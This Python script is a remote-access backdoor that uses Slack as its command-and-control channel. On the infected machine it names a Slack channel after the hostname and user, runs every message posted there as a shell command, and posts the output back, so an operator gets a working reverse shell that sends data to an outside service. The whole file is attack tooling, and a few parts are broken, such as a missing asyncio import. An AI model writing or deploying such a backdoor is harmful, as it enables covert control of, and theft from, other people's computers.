import slack, subprocess
from getpass import getuser

slack_token = 'CHANGE THIS'
oauth_token = 'CHANGE THIS'

client = slack.WebClient(token=slack_token)
oauth_client = slack.WebClient(token=oauth_token)


def run_command(cmd):
    return subprocess.Popen(cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, shell=True).communicate()
                            
def create_channel(Chan_name): 
    global targetID #Varibale to apply command only to the inteded host
    Chan_name = Chan_name.lower()
    response = client.channels_list()
    channels_list = []
    for n in response['channels']: #Go through all channels and make sure that we do not create an existing one.
        channels_list.append(n['name'])
        if(Chan_name == n['name']):
            client.chat_postMessage(channel='#general', text='[*] Channel '+Chan_name+' is already exists.')
            targetID = n['id'] #If the channel exists, make sure to assign the shell to that channel.
            return
    
    if(Chan_name not in channels_list): #Create the channel and assign targetID if is not found
        response = oauth_client.conversations_create(
            name=Chan_name,
            is_private=False
        )
        targetID = response['channel']['id']
        client.chat_postMessage(channel='#general', text='[+] Channel '+Chan_name+' is created. Have fun :)')


@slack.RTMClient.run_on(event='hello')
def start(**payload): #Each time the shell connect to Slack servers.
    global whoami
    cmd = ['hostname'] #Prepare the command to grab hostname/username.
    result = run_command(cmd) #Run the command.
    whoami = str(result[0].decode('utf-8') + '\\' + getuser()).replace('\r','').replace('\\','_').replace('\n','') #Store the result for later use.
    create_channel(whoami) #Create a channel named as the result of the command.


@slack.RTMClient.run_on(event='message')
def messaging(**payload): #Triggers each time the bot get a new message Note: the app must be part of that group to receive messages.
        data = payload['data']
        if ('subtype' in data and data['subtype'] == 'bot_message'): #To make sure that we do not execute the bot response.
            return
        if (data['channel'] == targetID): #To make sure we only execute the command on the intended bot.
            web_client = payload['web_client']
            rtm_client = payload['rtm_client']
            cmd = data['text'] #Shell command
            result = run_command(cmd)
            client.chat_postMessage(channel="#"+whoami, text='Output: '+str(result[0].decode('utf-8')))
        else:
            pass

rtm_client = slack.RTMClient(token=slack_token)
rtm_client.start()


async def run_api_test():
    response = await client.api_test()
    assert response["ok"]
    
if __name__ == "__main__":
    event_loop = asyncio.get_event_loop()
    event_loop.run_until_complete(run_api_test())
